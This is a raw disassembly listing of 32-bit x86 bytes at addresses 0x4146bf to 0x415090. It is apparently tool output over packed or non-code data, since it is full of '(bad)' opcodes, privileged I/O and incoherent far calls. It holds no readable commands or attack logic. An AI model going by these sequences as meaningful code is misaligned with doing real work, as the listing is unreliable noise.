  4146bf:	sahf   
  4146c0:	xor    DWORD PTR [edx],eax
  4146c2:	inc    ebp
  4146c3:	push   esi
  4146c4:	les    ecx,FWORD PTR [edx-0x4d5db088]
  4146ca:	mov    edx,0x73598a74
  4146cf:	test   DWORD PTR [esp+edi*8+0x50],0x667e1c87
  4146d7:	inc    ebp
  4146d8:	xchg   esi,eax
  4146d9:	mov    ds:0x62336408,eax
  4146de:	(bad)  
  4146df:	xchg   edx,eax
  4146e0:	clc    
  4146e1:	test   al,0x5d
  4146e3:	(bad)  
  4146e4:	retf   
  4146e5:	(bad)  
  4146e6:	xchg   ax,ax
  4146e8:	sub    eax,0x74293746
  4146ed:	sbb    al,ch
  4146ef:	pop    edx
  4146f0:	aas    
  4146f1:	imul   ebp,DWORD PTR fs:[ebx+0x33],0x5
  4146f6:	pop    es
  4146f7:	sti    
  4146f8:	mov    dh,0x86
  4146fa:	outs   dx,DWORD PTR ds:[esi]
  4146fb:	or     eax,0x78f80f68
  414700:	xchg   ebp,eax
  414701:	jl     0x414726
  414703:	pop    esp
  414704:	xchg   ebx,eax
  414705:	adc    dl,al
  414707:	xor    DWORD PTR [edi+0x11826564],0xd587194f
  414711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414712:	test   eax,0x9ef3291f
  414717:	scas   al,BYTE PTR es:[edi]
  414718:	jge    0x4146d2
  41471a:	or     DWORD PTR [esi+0x7f],edx
  41471d:	jle    0x41473f
  41471f:	add    eax,edx
  414721:	ss jg  0x414708
  414724:	shl    DWORD PTR [edx-0x32f09891],1
  41472a:	addr16 in eax,0xd3
  41472d:	outs   dx,DWORD PTR ds:[si]
  41472f:	or     al,0x31
  414731:	xor    dh,BYTE PTR [esi+0x4c]
  414734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414735:	mov    eax,ds:0x701af6ae
  41473a:	aam    0x8
  41473c:	rep lods al,BYTE PTR ds:[esi]
  41473e:	ret    0x52dc
  414741:	cs push ds
  414743:	scas   al,BYTE PTR es:[edi]
  414744:	xchg   BYTE PTR [ebp-0x470ce3d7],dh
  41474a:	jnp    0x41472d
  41474c:	inc    esi
  41474d:	mov    DWORD PTR [edx+0x4],ecx
  414750:	(bad)  
  414751:	push   edx
  414752:	and    DWORD PTR [eax-0x66],esi
  414755:	sub    al,0x6f
  414757:	addr16 pop es
  414759:	fcomp  QWORD PTR ds:0xcc56227a
  41475f:	and    DWORD PTR [ebx-0x62],esp
  414762:	cwde   
  414763:	outs   dx,BYTE PTR ds:[esi]
  414764:	pop    ebp
  414765:	xchg   edx,eax
  414766:	iret   
  414767:	xchg   BYTE PTR [ebp-0x14],al
  41476a:	sar    BYTE PTR [eax-0x6b],0xf9
  41476e:	xchg   ebp,eax
  41476f:	and    dl,bl
  414771:	gs aam 0xbe
  414774:	inc    edx
  414775:	lods   eax,DWORD PTR ds:[esi]
  414776:	inc    edx
  414777:	inc    ebx
  414778:	cmp    ch,BYTE PTR [esi+0x61]
  41477b:	test   al,0xc4
  41477d:	adc    DWORD PTR [edi+0x6a7769b5],0x26
  414784:	sub    dl,BYTE PTR [esi]
  414786:	inc    eax
  414787:	mov    bh,0x7e
  414789:	jne    0x414737
  41478b:	dec    esi
  41478c:	call   0x0:0xe90951db
	...
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x513ccf84
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x15000001
  41480d:	int    0x5
  41480f:	ja     0x4147a6
  414811:	xor    eax,0x78804b89
  414816:	stos   DWORD PTR es:[edi],eax
  414817:	es and eax,0x5ffdcf21
  41481d:	fucomi st,st(1)
  41481f:	mov    edi,0x47ea0d75
  414824:	xchg   ebp,eax
  414825:	push   es
  414826:	push   0x1be87d36
  41482b:	arpl   WORD PTR [eax+ebp*2],dx
  41482e:	iret   
  41482f:	xor    eax,0x44ce9f5f
  414834:	xchg   ecx,eax
  414835:	pop    ds
  414836:	dec    edx
  414837:	adc    esp,DWORD PTR [esi]
  414839:	scas   eax,DWORD PTR es:[edi]
  41483a:	pushf  
  41483b:	mov    DWORD PTR [esi-0x24],esi
  41483e:	std    
  41483f:	and    DWORD PTR [edx-0x540ab4d],ebp
  414845:	or     esi,ecx
  414847:	sti    
  414848:	sub    eax,0x109d677b
  41484d:	xor    DWORD PTR [edi-0x7d],ebp
  414850:	(bad)  
  414851:	cmp    al,0x5a
  414853:	fs hlt 
  414855:	imul   edi,DWORD PTR fs:[ebp-0x345a0a91],0x733b52ec
  414860:	repnz inc edi
  414862:	not    esp
  414864:	xchg   ebp,eax
  414865:	std    
  414866:	cli    
  414867:	xchg   esi,eax
  414868:	pop    es
  414869:	jne    0x41484b
  41486b:	fsubr  DWORD PTR [edx+0x4598164f]
  414871:	sbb    bl,BYTE PTR [ebx+ecx*1-0x1eb438ec]
  414878:	jge    0x4148e6
  41487a:	int    0xe9
  41487c:	fstp   st(5)
  41487e:	jae    0x4148c5
  414880:	mov    ebp,0x69108a35
  414885:	push   esi
  414886:	push   0xffffffa5
  414888:	push   ebx
  414889:	shl    DWORD PTR [edi],cl
  41488b:	cmp    al,BYTE PTR [edx]
  41488d:	stos   BYTE PTR es:[edi],al
  41488e:	ds mov al,0x3f
  414891:	ret    0x33f3
  414894:	inc    esi
  414895:	xchg   esi,eax
  414896:	pushf  
  414897:	adc    eax,0xffffffc2
  41489a:	mov    ecx,0x51774029
  41489f:	mov    ?,WORD PTR [edx]
  4148a1:	sbb    al,0x22
  4148a3:	call   0x9daae9a1
  4148a8:	pop    edx
  4148a9:	pop    eax
  4148aa:	test   al,0xa1
  4148ac:	cld    
  4148ad:	pop    es
  4148ae:	(bad)  
  4148af:	fidivr WORD PTR [edx+0x72]
  4148b2:	(bad)  
  4148b3:	jp     0x4148b3
  4148b5:	pop    eax
  4148b6:	scas   eax,DWORD PTR es:[edi]
  4148b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b8:	pop    ss
  4148b9:	test   BYTE PTR [edx+ebx*8],cl
  4148bc:	cmp    dl,al
  4148be:	mov    al,ds:0x2d77bd54
  4148c3:	rol    DWORD PTR [edi+esi*1-0x93def19],cl
  4148ca:	mov    ebp,0x19186384
  4148cf:	dec    edx
  4148d0:	fidivr DWORD PTR [eax+0x296bbc42]
  4148d6:	and    al,0xad
  4148d8:	ins    DWORD PTR es:[edi],dx
  4148d9:	daa    
  4148da:	clc    
  4148db:	bound  ebx,QWORD PTR [edi-0x36ff6341]
  4148e1:	inc    esp
  4148e2:	repnz lock dec eax
  4148e5:	shl    eax,0x5d
  4148e8:	xor    al,ah
  4148ea:	sbb    dl,BYTE PTR [edi+0x5f]
  4148ed:	mov    eax,ds:0xcd8d4316
  4148f2:	mov    eax,0x8e259217
  4148f7:	pusha  
  4148f8:	jmp    0xcb97:0x10ddb2f6
  4148ff:	shl    al,0x48
  414902:	retf   
  414903:	out    0x98,eax
  414905:	ins    BYTE PTR es:[edi],dx
  414906:	leave  
  414907:	cmp    edi,edi
  414909:	es adc al,0x60
  41490c:	xor    al,0xe8
  41490e:	cli    
  41490f:	leave  
  414910:	ins    BYTE PTR es:[edi],dx
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	(bad)  
  414983:	or     edi,edi
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR ds:0x37000001,al
  41498d:	rcr    DWORD PTR [esi],cl
  41498f:	repnz int 0x89
  414992:	(bad)  
  414993:	sub    cl,BYTE PTR [ebx-0xa]
  414996:	inc    esp
  414997:	or     DWORD PTR [edx+0x6b],eax
  41499a:	and    esi,ecx
  41499c:	neg    ch
  41499e:	xchg   ecx,eax
  41499f:	inc    eax
  4149a0:	mov    WORD PTR [ebp-0x34f4349f],ds
  4149a6:	cmp    DWORD PTR [ebx],ecx
  4149a8:	or     ecx,esp
  4149aa:	sti    
  4149ab:	mov    ecx,0x7eddac45
  4149b0:	jge    0x41496a
  4149b2:	in     eax,dx
  4149b3:	(bad)  
  4149b4:	ror    BYTE PTR [eax-0x43],1
  4149b7:	dec    eax
  4149b8:	xor    ch,BYTE PTR [esi]
  4149ba:	mov    cl,0x95
  4149bc:	repz mov dl,0xd7
  4149bf:	xor    eax,0xc5003b83
  4149c4:	push   ebp
  4149c5:	xchg   esp,eax
  4149c6:	cmp    ecx,DWORD PTR [ebx]
  4149c8:	xor    BYTE PTR [esi],cl
  4149ca:	fimul  DWORD PTR [ecx+0x60770103]
  4149d0:	inc    edi
  4149d1:	inc    ebp
  4149d2:	xchg   BYTE PTR [esi+0x1911c79b],al
  4149d8:	imul   esp,DWORD PTR [ebx],0xffffffaf
  4149db:	imul   esi,eax,0xffffff92
  4149de:	cmc    
  4149df:	mov    ds:0x519ccc06,al
  4149e4:	fdivr  QWORD PTR [ecx+ecx*8+0x577e425f]
  4149eb:	xor    BYTE PTR [esi],0xca
  4149ee:	jecxz  0x4149b8
  4149f0:	call   eax
  4149f2:	mov    edi,0x56c8bf06
  4149f7:	leave  
  4149f8:	out    0x3,al
  4149fa:	push   ds
  4149fb:	addr16 push esp
  4149fd:	jo     0x4149eb
  4149ff:	dec    edi
  414a00:	sub    eax,0xa4581dce
  414a05:	scas   eax,DWORD PTR es:[edi]
  414a06:	cmp    dh,0x8b
  414a09:	dec    BYTE PTR ds:0x3d43ca35
  414a0f:	dec    edi
  414a10:	cdq    
  414a11:	call   0xb238:0x979fff1c
  414a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a19:	sahf   
  414a1a:	add    edi,ebp
  414a1c:	and    eax,0x141ae669
  414a21:	pop    ds
  414a22:	cmp    ch,dl
  414a24:	jp     0x414a36
  414a26:	cwde   
  414a27:	(bad)  
  414a28:	mov    esi,0x272a424e
  414a2d:	ror    BYTE PTR [edi-0x45],1
  414a30:	clc    
  414a31:	mov    ebp,0xc46da83
  414a36:	inc    ecx
  414a37:	dec    ebp
  414a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a39:	pop    ecx
  414a3a:	loope  0x414a9e
  414a3c:	fcomp  DWORD PTR [ebx+0x34]
  414a3f:	sahf   
  414a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a41:	jmp    0x414a26
  414a43:	sbb    al,0x3b
  414a45:	mov    eax,ds:0xd23d16a
  414a4a:	sbb    BYTE PTR [ecx+0x2f],bl
  414a4d:	dec    ecx
  414a4e:	jle    0x414a9a
  414a50:	fisubr DWORD PTR [edx+0x47]
  414a53:	fmul   QWORD PTR [edi+0x5f1e9a68]
  414a59:	dec    eax
  414a5a:	jmp    0x414a91
  414a5c:	ror    dl,cl
  414a5e:	and    al,0xb1
  414a60:	dec    DWORD PTR [edi-0x55]
  414a63:	imul   esp,DWORD PTR [esi-0x65],0xffffff90
  414a67:	and    eax,0x7c70ab92
  414a6c:	and    eax,0xdc66078c
  414a71:	add    edx,DWORD PTR [ebx]
  414a73:	adc    eax,0xbc92a47f
  414a78:	pop    edi
  414a79:	and    al,0x64
  414a7b:	jbe    0x414aa4
  414a7d:	lods   al,BYTE PTR ds:[esi]
  414a7e:	fstp   TBYTE PTR [edx]
  414a80:	ret    
  414a81:	sbb    eax,0x6c0f927a
  414a86:	out    dx,eax
  414a87:	xor    DWORD PTR [ebp+0x74e9e489],ebx
  414a8d:	inc    esi
  414a8e:	(bad)  
  414a8f:	push   esp
  414a90:	adc    al,BYTE PTR [eax]
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x55aa63d9]
  414b02:	mov    dl,0xd2
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0xfa000001
  414b0d:	aad    0x18
  414b0f:	inc    ecx
  414b10:	lods   eax,DWORD PTR ds:[esi]
  414b11:	pusha  
  414b12:	rol    dh,cl
  414b14:	dec    esp
  414b15:	add    esi,0x2
  414b18:	jne    0x414aca
  414b1a:	jge    0x414b32
  414b1c:	pop    ss
  414b1d:	mov    esp,DWORD PTR [ecx]
  414b1f:	fnstsw WORD PTR ds:0xb40b3975
  414b25:	mov    dl,0x2a
  414b27:	js     0x414b8c
  414b29:	push   esp
  414b2a:	lock call 0xcbfb950a
  414b30:	ret    
  414b31:	lock mov edx,0x51425ab2
  414b37:	fstp   QWORD PTR [edi]
  414b39:	push   edx
  414b3a:	sub    bl,BYTE PTR [edx+0x1]
  414b3d:	cmp    DWORD PTR [edi+0x4f],ebp
  414b40:	clc    
  414b41:	test   eax,0x33b31cb1
  414b46:	push   edi
  414b47:	lahf   
  414b48:	daa    
  414b49:	imul   ebp,DWORD PTR [edi+0x31d3136a]
  414b50:	pop    ss
  414b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b52:	push   ebp
  414b53:	das    
  414b54:	fwait
  414b55:	pop    esp
  414b56:	mov    ch,0xd5
  414b58:	add    al,0xbb
  414b5a:	loope  0x414b32
  414b5c:	aas    
  414b5d:	cwde   
  414b5e:	aam    0xa0
  414b60:	outs   dx,DWORD PTR ds:[esi]
  414b61:	mov    ebp,ds
  414b63:	sbb    bl,cl
  414b65:	test   al,0x4b
  414b67:	pop    edi
  414b68:	into   
  414b69:	sbb    dl,BYTE PTR [edi+ebp*1+0x7047657d]
  414b70:	mov    ebx,edi
  414b72:	and    ecx,DWORD PTR [eax]
  414b74:	lods   al,BYTE PTR ds:[esi]
  414b75:	dec    ecx
  414b76:	sbb    DWORD PTR [esi-0xd839e46],edi
  414b7c:	xor    al,0x6b
  414b7e:	jno    0x414b37
  414b80:	(bad)  
  414b81:	mov    DWORD PTR [ebx+eiz*1],0x761c04f7
  414b88:	sub    al,al
  414b8a:	push   0x6d
  414b8c:	jp     0x414b6b
  414b8e:	jle    0x414b89
  414b90:	xchg   ebx,eax
  414b91:	xchg   BYTE PTR [edi-0x5bc029de],ch
  414b97:	mov    cl,BYTE PTR [ebp+0x22]
  414b9a:	into   
  414b9b:	(bad)  
  414b9d:	(bad)  
  414b9e:	jmp    0x414b85
  414ba0:	push   0x25
  414ba2:	or     BYTE PTR [edx],bl
  414ba4:	(bad)  
  414ba6:	es ins DWORD PTR es:[edi],dx
  414ba8:	add    eax,0xd362fee6
  414bad:	lea    edi,[ecx+0x5b]
  414bb0:	xlat   BYTE PTR ds:[ebx]
  414bb1:	bound  eax,QWORD PTR [esi-0x23a6098f]
  414bb7:	bnd ret 
  414bb9:	jle    0x414b7d
  414bbb:	ds mov ebx,0x16dacb1d
  414bc1:	in     al,0xc7
  414bc3:	das    
  414bc4:	popa   
  414bc5:	pop    ebx
  414bc6:	cmp    cl,BYTE PTR [edi+0x8]
  414bc9:	test   ah,0x1d
  414bcc:	fld    DWORD PTR [ebx+0x7f]
  414bcf:	push   ss
  414bd0:	popa   
  414bd1:	test   DWORD PTR [edx],edi
  414bd3:	dec    esi
  414bd4:	push   ebx
  414bd5:	xchg   esp,edi
  414bd7:	ja     0x414b76
  414bd9:	inc    eax
  414bda:	stos   BYTE PTR es:[edi],al
  414bdb:	in     al,0x73
  414bdd:	xor    bh,ah
  414bdf:	xchg   DWORD PTR [edx-0x4cbfac2],ebp
  414be5:	popf   
  414be6:	loopne 0x414c42
  414be8:	cli    
  414be9:	call   0xc143:0x7a9e749d
  414bf0:	inc    edi
  414bf1:	and    DWORD PTR ds:0x47e0b248,esp
  414bf7:	xor    ah,BYTE PTR [edi+edx*4+0x4cebec16]
  414bfe:	inc    edx
  414bff:	into   
  414c00:	push   edi
  414c01:	icebp  
  414c02:	or     eax,0x3d0764ce
  414c07:	xor    al,cl
  414c09:	pop    edi
  414c0a:	mov    ss,WORD PTR es:[ebx-0x30]
  414c0e:	stos   DWORD PTR es:[edi],eax
  414c0f:	push   eax
  414c10:	xchg   DWORD PTR [eax],eax
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebx,DWORD PTR cs:[edi+0x7a]
  414c82:	sbb    DWORD PTR [eax+0xdb09],ecx
  414c88:	add    eax,0x6f000001
  414c8d:	in     al,0x89
  414c8f:	or     ch,BYTE PTR [esi+0x27]
  414c92:	cdq    
  414c93:	aaa    
  414c94:	(bad)  
  414c95:	lods   eax,DWORD PTR ds:[esi]
  414c96:	daa    
  414c97:	mov    eax,0xc6c4d2aa
  414c9c:	in     eax,dx
  414c9d:	jnp    0x414cde
  414c9f:	dec    ebp
  414ca0:	rol    DWORD PTR [ebp-0x39],cl
  414ca3:	rol    DWORD PTR [esi-0x6bd60eab],0xd
  414caa:	mov    dh,0x46
  414cac:	xchg   ebx,eax
  414cad:	or     esp,DWORD PTR [ebp-0x74]
  414cb0:	add    DWORD PTR [ebp-0x15],0xace24278
  414cb7:	dec    ecx
  414cb8:	mov    al,ds:0x20c5ab46
  414cbd:	jae    0x414d36
  414cbf:	pop    esp
  414cc0:	mov    dl,0xe4
  414cc2:	mov    DWORD PTR [ecx+0x6fd4dff6],eax
  414cc8:	popa   
  414cc9:	xor    al,0x51
  414ccb:	sbb    ch,ah
  414ccd:	lods   eax,DWORD PTR ds:[esi]
  414ccf:	in     al,dx
  414cd0:	test   eax,0x3e78b999
  414cd5:	adc    al,0x7b
  414cd7:	clc    
  414cd8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cda:	cwde   
  414cdb:	cmp    al,BYTE PTR [eax]
  414cdd:	scas   eax,DWORD PTR es:[edi]
  414cde:	sbb    eax,ecx
  414ce0:	mov    al,0xa8
  414ce2:	mov    eax,0xb5aa4b6a
  414ce7:	retf   
  414ce8:	outs   dx,BYTE PTR ds:[esi]
  414ce9:	xlat   BYTE PTR ds:[ebx]
  414cea:	(bad)  
  414ceb:	shr    BYTE PTR [edx+0x104243e3],cl
  414cf1:	sbb    eax,DWORD PTR [esi-0x29]
  414cf4:	dec    edi
  414cf5:	dec    esi
  414cf6:	scas   eax,DWORD PTR es:[edi]
  414cf7:	test   BYTE PTR [ecx],ch
  414cf9:	sbb    DWORD PTR [edi],ebx
  414cfb:	popa   
  414cfc:	fsub   QWORD PTR [ecx]
  414cfe:	(bad)  
  414cff:	cmp    eax,0x9fe3e1da
  414d04:	push   esi
  414d05:	inc    eax
  414d06:	jge    0x414cd0
  414d08:	cmp    ebp,esi
  414d0a:	dec    edi
  414d0b:	inc    ecx
  414d0c:	and    ebp,DWORD PTR ds:0x3d62c87f
  414d12:	scas   al,BYTE PTR es:[edi]
  414d13:	jns    0x414d36
  414d15:	(bad)  
  414d17:	xchg   BYTE PTR [eax+0x75b070de],cl
  414d1d:	inc    edx
  414d1e:	add    edi,DWORD PTR [eax+0x2bb81974]
  414d24:	mov    esi,DWORD PTR [esi+ecx*2+0x6e]
  414d28:	sbb    al,0x44
  414d2a:	stos   DWORD PTR es:[edi],eax
  414d2b:	jbe    0x414d1c
  414d2d:	enter  0x51b1,0x93
  414d31:	mov    eax,0xe9fe8562
  414d36:	inc    ecx
  414d37:	cmp    al,0x36
  414d39:	mov    edi,0xe2c05d47
  414d3e:	imul   esp,DWORD PTR [ebx+0x5c],0x77
  414d42:	xchg   ebp,eax
  414d43:	dec    ebx
  414d44:	dec    edx
  414d45:	mov    WORD PTR [esi+0x66],ds
  414d48:	jno    0x414d01
  414d4a:	sub    DWORD PTR [edi],edi
  414d4c:	in     eax,0x3d
  414d4e:	(bad)  
  414d4f:	fstp   QWORD PTR ds:0xfc347321
  414d55:	add    BYTE PTR [esi-0x5e08b53a],ah
  414d5b:	call   0xe572:0x27f13a4d
  414d62:	xor    al,0xa3
  414d64:	jns    0x414d5d
  414d66:	push   esi
  414d67:	arpl   WORD PTR [ecx-0xe78941c],ax
  414d6d:	(bad)  
  414d6e:	jmp    0x414de3
  414d70:	jle    0x414dde
  414d72:	push   0x59
  414d74:	test   eax,0x109a40ec
  414d79:	and    eax,0xfbbf5627
  414d7e:	stc    
  414d7f:	xchg   ebp,eax
  414d80:	adc    bh,cl
  414d82:	xchg   edi,eax
  414d83:	sahf   
  414d84:	(bad)  
  414d86:	xchg   ebp,eax
  414d87:	and    WORD PTR [eax],sp
  414d8a:	push   cs
  414d8b:	inc    ebp
  414d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8d:	mov    bh,0xc9
  414d8f:	div    ah
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xa45f20f5
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x42000001,al
  414e0d:	scas   eax,DWORD PTR es:[edi]
  414e0e:	push   eax
  414e0f:	mul    BYTE PTR [ecx+eax*1+0x68]
  414e13:	mov    cl,0xdd
  414e15:	test   esi,edx
  414e17:	icebp  
  414e18:	test   DWORD PTR [edx],0xe0c16bff
  414e1e:	enter  0x932b,0xd7
  414e22:	and    eax,0x3f30fc04
  414e27:	lods   al,BYTE PTR ds:[esi]
  414e28:	mov    eax,DWORD PTR cs:[ebx]
  414e2b:	xchg   esp,eax
  414e2c:	inc    edx
  414e2d:	scas   eax,DWORD PTR es:[edi]
  414e2e:	fs pop es
  414e30:	rol    BYTE PTR [edi*2-0x3448cde5],1
  414e37:	push   edi
  414e38:	mov    esi,0xd6d53a6b
  414e3d:	pop    esi
  414e3e:	push   ebx
  414e3f:	fisttp WORD PTR [eax-0x7f]
  414e42:	jns    0x414e03
  414e44:	repz rol esp,1
  414e47:	fiadd  WORD PTR [ebx]
  414e49:	fdivr  QWORD PTR [ebx-0x5e0f1049]
  414e4f:	cmp    ebx,DWORD PTR [ebx]
  414e51:	mov    bl,0x6c
  414e53:	mov    esi,0xb01213fd
  414e58:	rcr    DWORD PTR [eax+esi*8+0x41],1
  414e5c:	xchg   BYTE PTR [edi],ah
  414e5e:	sbb    dh,BYTE PTR [ebx+0x54]
  414e61:	mov    edx,0xf9c83119
  414e66:	ins    BYTE PTR es:[edi],dx
  414e67:	jb     0x414ea1
  414e69:	add    eax,0x338f71ac
  414e6e:	int    0x22
  414e70:	add    al,BYTE PTR [eax+0x13]
  414e73:	xor    eax,eax
  414e75:	mov    dh,bl
  414e77:	repnz bound edi,QWORD PTR ds:[ebx]
  414e7b:	popf   
  414e7c:	pusha  
  414e7d:	je     0x414ed8
  414e7f:	(bad)  
  414e80:	(bad)  
  414e81:	mov    ebp,0x17d6480
  414e86:	add    eax,0x390d9cea
  414e8b:	outs   dx,DWORD PTR ds:[esi]
  414e8c:	pusha  
  414e8d:	(bad)  
  414e8e:	jle    0x414e47
  414e90:	rcr    BYTE PTR [ebp+0x26],cl
  414e93:	imul   ecx,DWORD PTR [esp+eiz*8-0x4f],0xffffffb8
  414e98:	stc    
  414e99:	ins    DWORD PTR es:[edi],dx
  414e9a:	imul   edx,DWORD PTR [edx+0x1ee022cc],0x74
  414ea1:	cmp    dl,cl
  414ea3:	add    ch,BYTE PTR [eax-0x70ba62aa]
  414ea9:	cli    
  414eaa:	fisttp DWORD PTR [edx]
  414eac:	jp     0x414ea1
  414eae:	sahf   
  414eaf:	xchg   DWORD PTR [eax],ebp
  414eb1:	(bad)
  414eb6:	das    
  414eb7:	ds mov al,0x39
  414eba:	mov    dh,0xe1
  414ebc:	push   ss
  414ebd:	and    BYTE PTR [edi+0x75],dl
  414ec0:	lock pop esp
  414ec2:	sub    eax,0xc55f5c4b
  414ec7:	clc    
  414ec8:	mov    eax,ds:0x39409bf1
  414ecd:	inc    edx
  414ece:	das    
  414ecf:	in     al,0x10
  414ed1:	or     bh,0xa0
  414ed4:	pop    esp
  414ed5:	and    dl,BYTE PTR [ebp-0x1b7ab290]
  414edb:	pop    esp
  414edc:	mov    cl,al
  414ede:	je     0x414ed4
  414ee0:	add    eax,0x85721fc0
  414ee5:	jg     0x414f05
  414ee7:	mov    ds:0x591c7b02,al
  414eec:	in     eax,0x38
  414eee:	nop
  414eef:	fidivr WORD PTR [edx]
  414ef1:	add    al,0xeb
  414ef3:	imul   ebp,DWORD PTR [eax],0xfffffff6
  414ef6:	jmp    0x414f2a
  414ef8:	pusha  
  414ef9:	repz mov ds:0xf612237f,al
  414eff:	ret    
  414f00:	push   cs
  414f01:	hlt    
  414f02:	ror    eax,0xae
  414f05:	dec    ecx
  414f06:	test   eax,0x86b0c65b
  414f0b:	outs   dx,DWORD PTR ds:[esi]
  414f0c:	ds pop es
  414f0e:	(bad)  
  414f0f:	cmp    eax,DWORD PTR [ecx+0x0]
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xafa1e3f6
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x98000001
  414f8d:	push   edx
  414f8e:	pop    ebx
  414f8f:	inc    ebx
  414f90:	ja     0x414f39
  414f92:	popf   
  414f93:	mov    ebp,0xa20d757b
  414f98:	ret    0x5128
  414f9b:	add    BYTE PTR ds:0x54b12be9,ah
  414fa1:	inc    ebp
  414fa2:	xor    al,0xf
  414fa4:	in     al,dx
  414fa5:	out    dx,al
  414fa6:	push   ebp
  414fa7:	cmp    DWORD PTR [edx-0x3a9887fa],ecx
  414fad:	std    
  414fae:	aas    
  414faf:	mov    edi,0x31c44cae
  414fb4:	out    dx,al
  414fb5:	cmp    DWORD PTR [ebx],0x18
  414fb8:	(bad)  
  414fb9:	xchg   esp,eax
  414fba:	mul    BYTE PTR [edx+ebx*2-0x7ead97ff]
  414fc1:	push   ecx
  414fc2:	adc    dh,bh
  414fc4:	sbb    al,BYTE PTR [ebp-0x6a14cb74]
  414fca:	push   ds
  414fcb:	in     eax,0x6c
  414fcd:	in     al,0xc1
  414fcf:	loope  0x414fc9
  414fd1:	push   esi
  414fd2:	mov    ah,0x53
  414fd4:	or     BYTE PTR [edi-0x2874a40c],bl
  414fda:	aad    0xda
  414fdc:	sti    
  414fdd:	push   0x6899aa1b
  414fe2:	pop    ss
  414fe3:	xor    ebp,esp
  414fe5:	dec    ebp
  414fe6:	out    dx,eax
  414fe7:	mov    ds:0xc921dd66,eax
  414fec:	pushf  
  414fed:	xor    esi,DWORD PTR [ecx+0x5d93ddf8]
  414ff3:	popa   
  414ff4:	sbb    dl,0xbe
  414ff7:	sbb    eax,0x8932faf8
  414ffc:	popa   
  414ffd:	jmp    ebp
  414fff:	xchg   ebx,eax
  415000:	or     eax,edi
  415002:	sub    eax,0xa1c96b01
  415007:	push   edi
  415008:	out    0x9,al
  41500a:	mov    ds:0xdb04a08a,eax
  41500f:	outs   dx,DWORD PTR ds:[esi]
  415010:	and    al,0x8
  415012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415013:	mov    esi,0x988ca048
  415018:	mov    ah,0x74
  41501a:	popf   
  41501b:	daa    
  41501c:	pop    ebp
  41501d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41501e:	out    0x22,eax
  415020:	addr16 jne 0x41508d
  415023:	xchg   DWORD PTR [edx-0x65],esi
  415026:	sar    BYTE PTR [edi],0x8a
  415029:	and    al,0x63
  41502b:	inc    edi
  41502c:	pop    ebp
  41502d:	out    dx,eax
  41502e:	loope  0x415099
  415030:	or     ebx,DWORD PTR [esi+0x7f991345]
  415036:	cs mov ebp,0x9380a7eb
  41503c:	cmp    al,BYTE PTR [edx]
  41503e:	inc    ecx
  41503f:	rol    BYTE PTR [eax],1
  415041:	imul   edx,DWORD PTR [esi-0x31837634],0x23
  415048:	dec    ebp
  415049:	call   0x778fc532
  41504e:	in     al,0x69
  415050:	pop    es
  415051:	sbb    ecx,eax
  415053:	jle    0x415023
  415055:	sub    eax,0x60f912ec
  41505a:	inc    esp
  41505b:	retf   
  41505c:	aas    
  41505d:	aaa    
  41505e:	test   DWORD PTR [edx-0x38],eax
  415061:	push   ecx
  415062:	adc    DWORD PTR [eax-0x5e],ebx
  415065:	adc    esp,DWORD PTR [ebx-0x3b62fc37]
  41506b:	out    dx,eax
  41506c:	and    DWORD PTR [edi],ebx
  41506e:	pop    edx
  41506f:	bound  ebx,QWORD PTR [esi]
  415071:	sub    ebx,DWORD PTR [edi-0x5acf8e10]
  415077:	sub    DWORD PTR [esi+0x7c],ebx
  41507a:	nop
  41507b:	std    
  41507c:	dec    esp
  41507d:	xor    al,0xb7
  41507f:	(bad)  
  415080:	mov    WORD PTR [eax-0x76],ds
  415083:	add    DWORD PTR [eax],esp
  415085:	lods   eax,DWORD PTR ds:[esi]
  415086:	jno    0x41504f
  415088:	(bad)  
  415089:	adc    esi,DWORD PTR [esi]
  41508b:	jnp    0x415044
  41508d:	or     bl,dl
  41508f:	push   cs
  415090:	sub    DWORD PTR [eax],eax
	...
